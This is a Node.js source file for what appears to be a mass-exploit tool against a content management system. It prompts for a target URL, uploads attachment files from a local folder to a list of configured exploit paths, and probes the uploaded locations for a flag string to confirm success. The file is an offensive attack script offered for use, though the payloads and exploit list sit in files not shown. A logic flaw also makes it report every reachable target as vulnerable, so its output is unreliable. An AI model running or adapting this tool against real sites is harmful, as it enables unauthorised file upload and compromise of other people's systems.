const fs = require('fs');
const prompt = require('prompt-sync')();
const FormData = require('form-data');
const axios = require('axios');
const { error } = require('console');

let config = fs.readFileSync('config.json');
let dataConfig = JSON.parse(config);
let exploits = dataConfig.exploit;

function isVulnerable(target, flag, name) {
    axios.get(target)
        .then(function (response) {
            if (response.data.includes(flag)) {
                console.log('[%] Vuln ' + name + ' : ' + target)
            } else {
                console.log('[%] Vuln ' + name + ' : ' + target)
            }
        })
        .catch(function (error) {
            console.log('[%] Somtehing Error | Exploit ' + name + ' : ' + target);
        });
}

function scanning(target) {
    console.log('[%] Scanning Target : ' + target)
    for (let index = 0; index < exploits.length; index++) {
        let name = exploits[index].name;
        let method = exploits[index].method;
        let path = exploits[index].path;
        let access = exploits[index].access;
        let csrf = exploits[index].csrf;
        let flag = exploits[index].flag;
        let data = exploits[index].data;
        let attachment = exploits[index].attachment;

        console.log('[%] Checking ' + name + ' : ' + target)
        console.log('[%] Method ' + method + ' : ' + target)

        let endpoint = target + path;
        let form = new FormData();
        let file = fs.readFileSync('./inc/' + attachment);
        form.append(csrf, file, attachment);

        if (typeof (data) == 'object' && data.length > 0) {
            for (let dataIndex = 0; dataIndex < data.length; dataIndex++) {
                let params = data[dataIndex].params;
                let value = data[dataIndex].value;
                form.append(params, value);
            }
        }

        axios.post(endpoint, form)
            .then(function (response) {
                if (typeof (access) == 'object') {
                    for (let accessing = 0; accessing < access.length; accessing++) {
                        let check = target + access[accessing];
                        isVulnerable(check, flag, name)
                    }
                } else {
                    let check = target + access;
                    isVulnerable(check, flag, name)
                }
            })
            .catch(function () {
                console.log('[%] Somtehing Error | Exploit ' + name + ' : ' + target);
            });
    }
}

function init() {
    console.log('[!] Author   : ' + dataConfig.author);
    console.log('[!] Update   : ' + dataConfig.updated);
    console.log('[!] CMS      : ' + dataConfig.cms);
    console.log('[!] Exploit  : ' + dataConfig.exploit.length + ' Exploit');
    console.log('');

    target = prompt('[?] Target   : ');
    scanning(target);
}

init();